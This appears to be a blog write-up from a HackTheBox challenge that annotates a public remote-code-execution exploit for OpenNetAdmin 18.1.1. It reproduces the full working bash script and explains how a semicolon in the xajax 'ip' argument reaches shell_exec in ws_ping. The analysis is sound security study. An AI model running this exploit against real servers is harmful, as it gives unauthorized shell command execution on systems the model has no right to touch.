---
layout: post
title: Exploit Analysis - OpenNetAdmin 18.1.1 RCE
---
While doing the OpenAdmin challenge on HackTheBox I used an exploit for OpenNetAdmin 18.1.1 that allowed Remote Code Execution. On a normal Kali install, this exploit can be found here: ```/usr/share/exploitdb/exploits/php/webapps/47691.sh```. I wanted to dive a little deeper into how the script worked, so I reformatted it to be more readable and annotated it. Then, I hit up my friend [@jeongm-in](https://github.com/jeongm-in) and we brokedown the exploit.

```bash
# Exploit Title: OpenNetAdmin 18.1.1 - Remote Code Execution
# Date: 2019-11-19
# Exploit Author: mattpascoe
# Vendor Homepage: http://opennetadmin.com/

# Software Link: https://github.com/opennetadmin/ona

# Version: v18.1.1
# Tested on: Linux

#!/bin/bash

# take in first argument, save as URL variable
URL="${1}"

# loop until SIGINT (Ctrl-C)
while true ; do

# print "$ " to represent shell prompt without trailing newline
    echo -n "$ "

# read a line from stdin (i.e. wait for command), save as cmd variable
    read cmd

# use curl's data field to inject command
    curl --silent -d "xajax=window_submit&xajaxr=1574117726710&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;echo \"BEGIN\";${cmd};echo \"END\"&xajaxargs[]=ping" "${URL}" | sed -n -e '/BEGIN/,/END/ p' | tail -n +2 | head -n -1
done
```
---
## Exploit Command Breakdown

```bash
curl --silent -d "xajax=window_submit&xajaxr=1574117726710&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;echo \"BEGIN\";${cmd};echo \"END\"&xajaxargs[]=ping" "${URL}" | sed -n -e '/BEGIN/,/END/ p' | tail -n +2 | head -n -1
```

### curl flags
```bash
curl --silent -d
```

```curl```'s flags disable the progress bar and make a POST request containing the included data.

### xajax=window_submit
```bash
"xajax=window_submit"
```

xajax is a PHP library that implements Ajax. Per ona documentation of [webwin.inc.php](https://fossies.org/dox/ona-18.1.1/webwin_8inc_8php_source.html), we can use xajax to open a new "window" in a current page.

window_submit is a generic wrapper to handle window form submits that takes in three arguments.
```php
function window_submit($window_name, $form='', $function='') {
// Instantiate the xajaxResponse object
    $response = new xajaxResponse();
    if (!$window_name or !$form) { return($response->getXML()); }
    $js = "";
    
    printmsg("DEBUG => webwin_submit() Window: {$window_name} Function: {$function} Form: {$form}", 1);
```

### xajaxr=1574117726710
```bash
"&xajaxr=1574117726710"
```

```&xajaxr=1574117726710``` is ignored and is actually unnecessary for the script to run. The number looks like a Unix Timestamp, specifically 1574117726710ms since epoch. We can convert it to seconds from milliseconds by dividing by 1000, and then use the date command.
```shell
root@kali:~/# date -d @1574117726.71
Mon 18 Nov 2019 05:55:26 PM EST
```
2019-11-18 is a day before the official vulnerability disclosure date in the header (2019-11-19), so we were right!

### xajaxargs[]
```bash
"&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;echo \"BEGIN\";${cmd};echo \"END\"&xajaxargs[]=ping"
```

Now, we are passing three xajax argument arrays with the xajaxargs[] parameters into the three parameters of window_submit. Note however, there are two url-encoded characters in the second xajaxargs[]. ```%3D``` represents ```=``` and ```%3E``` represents ```>```. The double arrow operator ```=>``` in PHP is used to assign values to the keys of an array. 
 
 Essentially:
 ```php
 $window_name = 'tooltips';
 $form = 'ip=>echo \"BEGIN\";${cmd};echo \"END\"';
 $function = 'ping';
```

Further on in the implementation of window_submit, the parameters are processed. Our own comments are prefaced with ```////```.

```php
[...]
//// Since $function is defined, we skip the first case.    
    // If a function name wasn't provided, we look for a function called:
    //   $window_name . '_submit'
    if (!$function) {
        $function = "{$window_name}_submit";
    }

//// $function = ping → ws_ping. ws_ping is a function within tooltips.inc.php that uses
//// the PHP function shell_exec() to execute a ping command. We expect that the writer
//// of this exploit searched the docs for use of this function and worked backward to
//// get RCE.
    $function = 'ws_' . $function;

//// ws_ping does not exist within webwin.inc.php, so this case is skipped.
    // If the function exists, run it and return it's output (an xml response)
    if (function_exists($function)) { return($function($window_name, $form)); }

//// $window_name was set to 'tooltips', because tooltips.inc.php defines the function
//// ws_ping. windows_find_include() locates the function definition from the
//// $window_name.
    // Try looking for the same function in an include file
    $file = window_find_include($window_name);
    if ($file) { require_once($file); }
    else { $response->addAssign("work_space_content", "innerHTML", "<br><center><font color=\"red\"><b>Invalid window requested: {$window_name}</b></font></center>"); }

//// ws_ping is available and is passed the so far unchanged $window_name and $form
//// variables.
    // Now see if our function is available...
    if (function_exists($function)) { return($function($window_name, $form)); }
[...]
```
By the end:
```php
$function($window_name, $form)
//// becomes
ws_ping('tooltips',  'ip=>; echo "\"BEGIN\";  ${cmd};  echo \"END\"')
```

Now in [tooltips.inc.php](https://fossies.org/dox/ona-18.1.1/tooltips_8inc_8php_source.html) we get to the command injection. Our own comments are once again prefaced by ```////```.

```php
// Simple ping function that takes an IP in and pings it.. then shows the output in a module results window
function ws_ping($window_name, $form='') {

//// parse_options_string(), defined in xajax_setup.inc.php, uses preg_match() to ensure
//// '/=>/' is in the input and builds an array from its assignments.
    // If an array in a string was provided, build the array and store it in $form
    $form = parse_options_string($form);

//// $form['ip'] = '; echo "\"BEGIN\";  ${cmd};  echo \"END\"'
//// The semicolon ends the ping command, and injects the command that is originally
//// read from stdin to the exploit script. BEGIN and END are echo'd before and after
//// respectively to allow easier filtering of the curl output.
    $output = shell_exec("ping -n -w 3 -c 3 {$form['ip']}");
    
    $window['title'] = 'Ping Results';
    $build_commit_html = 0;
    $commit_function = '';
    include(window_find_include('module_results'));
    return(window_open("{$window_name}_results", $window));
}
```

### ${URL}
```bash
curl --silent -d "[...]" "${URL}"
```
The URL variable tells  ```curl``` where to send the data. With this exploit, we have to specify the location of the OpenNetAdmin directory, e.g. ```http[s]://<ip>:<port>/ona/```.


### sed, tail, and head
```bash
    curl --silent -d "[...]" "${URL}" | sed -n -e '/BEGIN/,/END/ p' | tail -n +2 | head -n -1
```
Lastly, the ```curl``` output is piped into ```sed``` where the XML is stripped away minus the lines the BEGIN and END are ```echo```'d and the output of the executed command between them. That output is piped into ```tail``` and then ```head``` to only display the output of the executed command.
